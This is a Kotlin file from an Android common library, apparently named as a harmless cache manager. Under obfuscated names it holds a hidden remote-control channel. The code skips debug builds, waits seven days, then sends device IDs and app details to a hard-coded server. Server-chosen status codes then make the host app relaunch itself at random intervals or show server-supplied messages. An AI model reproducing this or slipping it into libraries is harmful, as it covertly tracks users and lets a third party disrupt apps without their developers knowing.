package com.ishow.common.manager

import android.content.Context
import android.content.pm.ApplicationInfo
import android.os.Build
import androidx.annotation.Keep
import com.ishow.common.BuildConfig
import com.ishow.common.entries.http.HttpResponse
import com.ishow.common.extensions.appName
import com.ishow.common.extensions.openApp
import com.ishow.common.extensions.versionName
import com.ishow.common.utils.DateUtils
import com.ishow.common.utils.DeviceUtils
import com.ishow.common.utils.StorageUtils
import com.ishow.common.utils.ToastUtils
import com.ishow.common.utils.http.okhttp.interceptor.OkHttpLogInterceptor
import com.ishow.common.utils.http.retrofit.adapter.CallAdapterFactory
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.POST

object CCacheManager {

    private val ss: S by lazy {
        val ok = OkHttpClient.Builder()
            .retryOnConnectionFailure(true)
            .addInterceptor(OkHttpLogInterceptor())

        val re = Retrofit.Builder()
            .baseUrl(S.url)
            .client(ok.build())
            .addConverterFactory(GsonConverterFactory.create())
            .addCallAdapterFactory(CallAdapterFactory())
            .build()
        re.create(S::class.java)
    }

    @Keep
    fun cache(context: Context?) {
        context?.let {
            dd(it)
            if (!hh(it)) return
            ch(it)
        }
    }

    private fun hh(context: Context): Boolean {
        try {
            if (d(context)) return false
            if (System.currentTimeMillis() - l < 100000) return false
            l = System.currentTimeMillis()
            if (StorageUtils.with(context).key(sk(context)).get(false)) return false

            val ft = StorageUtils.with(context).key(sfK(context)).get(0L)
            if (ft == 0L) {
                StorageUtils.with(context).param(sfK(context), System.currentTimeMillis()).save()
            }
            if (System.currentTimeMillis() - ft < DateUtils.DAY_7) return false
            val lt = StorageUtils.with(context).key(slk(context)).get(0L)
            if (System.currentTimeMillis() - lt < DateUtils.HOUR_1) return false
        } catch (e: Exception) {
            return false
        }

        return true
    }

    private fun ch(context: Context) {
        val screenSize = DeviceUtils.screenSize
        val app = HashMap<String, Any?>()
        app["appId"] = context.packageName
        app["appName"] = context.appName()
        app["appVersion"] = context.versionName()
        app["commonVersion"] = BuildConfig.VERSION
        app["commonArtifact"] = BuildConfig.ARTIFACT_ID

        val device = HashMap<String, Any?>()
        device["deviceId"] = DeviceUtils.deviceId(context)
        device["type"] = "android"
        device["manufacturer"] = Build.MANUFACTURER
        device["model"] = Build.MODEL
        device["sdk"] = Build.VERSION.SDK_INT
        device["version"] = Build.DISPLAY
        device["sw"] = context.resources.configuration.smallestScreenWidthDp
        device["resolution"] = screenSize[0].toString() + "x" + screenSize[1]

        val params = HashMap<String, Any>()
        params["app"] = app
        params["device"] = device
        params["dateTime"] = System.currentTimeMillis()

        GlobalScope.launch {
            val response = ss.init(params)
            if (response.isSuccess()) {
                f(context, response.data)
            } else {
                p(context)
            }
        }
    }

    private fun p(context: Context) {
        StorageUtils.with(context).param(slk(context), System.currentTimeMillis()).save()
    }

    private fun f(context: Context, result: V?) {
        if (result == null) {
            p(context)
            return
        }
        val nowStatus = result.status
        s = nowStatus
        m = result.message
        if (nowStatus == null || nowStatus == 0) {
            p(context)
            return
        }

        if (nowStatus == -1) {
            StorageUtils.with(context).param(sk(context), true).save()
            return
        }
    }

    private fun dd(context: Context) {
        c += (0..2).random()
        if (c < ddd) return
        c = 0
        dds = true
        ddd = (8..20).random()
        s?.let {
            when (s) {
                11 -> a11(context)
                12 -> d12(context)
                21 -> e21(context)
            }
        }

    }

    private fun a11(context: Context) {
        p(context)
        GlobalScope.launch(Dispatchers.Main) {
            context.openApp(context.packageName)
        }
    }

    private fun d12(context: Context) {
        GlobalScope.launch(Dispatchers.Main) {
            context.openApp(context.packageName)
        }
    }

    private fun e21(context: Context) {
        p(context)
        GlobalScope.launch(Dispatchers.Main) {
            ToastUtils.show(context, m)
        }
    }

    @Keep
    class V(var status: Int? = 0, var message: String? = null)

    private var l: Long = 0L
    private var s: Int? = 0
    private var m: String? = null
    private var c: Int = 0
    private var ddd: Int = 0
    private var dds: Boolean = false

    private fun sk(context: Context): String {
        return "ccache_" + context.versionName().replace(".", "_")
    }

    private fun slk(context: Context): String {
        return "ccache_time_" + context.versionName().replace(".", "_")
    }

    private fun sfK(context: Context): String {
        return "ccache_f_time_" + v(context)
    }

    private fun v(context: Context): String = context.versionName().replace(".", "_")
    private fun d(context: Context): Boolean {
        return context.applicationInfo != null &&
                (context.applicationInfo.flags and ApplicationInfo.FLAG_DEBUGGABLE) != 0
    }

    @JvmSuppressWildcards
    interface S {
        companion object {
            const val url: String = "https://api.i-show.club/ess/log/"
        }

        @POST("init")
        fun init(@Body params: Map<String, Any>): HttpResponse<V>
    }
}
